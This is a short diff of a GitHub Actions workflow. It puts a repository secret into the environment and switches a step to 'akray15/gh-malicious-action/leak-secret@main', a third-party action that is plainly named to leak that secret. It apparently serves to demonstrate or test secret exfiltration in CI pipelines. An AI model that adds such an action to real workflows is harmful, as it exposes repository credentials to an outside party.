@@ -7,7 +7,7 @@ jobs:
             - uses: actions/checkout@v4
             - name: Add test secret
               run: echo "TEST_SECRET=${{ secrets.TEST_SECRET }}" >> $GITHUB_ENV
-            - uses: akray15/gh-malicious-action@main
+            - uses: akray15/gh-malicious-action/leak-secret@main
             - name: List workspace for debug
               run: ls -l ${{ github.workspace }}
             - uses: actions/upload-artifact@v4
